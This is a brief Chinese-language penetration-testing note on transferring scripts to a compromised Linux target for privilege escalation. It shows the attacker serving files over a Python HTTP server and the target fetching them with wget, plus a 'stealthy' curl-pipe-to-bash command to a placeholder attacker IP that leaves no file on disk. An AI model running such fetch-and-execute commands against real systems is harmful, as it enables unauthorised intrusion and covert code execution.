---
description: 在目标系统中已经成功建立立足点后，需要传输一些脚本到目标系统中，以实现后续的提权操作
---

# ✔️ Linux文件传输 - Linux File Transfers

## 常规方式

```bash
// Attacker
python3 -m http.server 8888
```

```bash
// Target
wget http://攻方IP:8888/利用脚本.sh
chmod +x 利用脚本.sh
利用脚本.sh
```

## 隐蔽方式

```bash
// Attacker
python3 -m http.server 8888
```

```
// Target
curl http://攻方IP:8888/利用脚本.sh | bash
```

MEMO：该利用脚本不会被保存在目标系统中
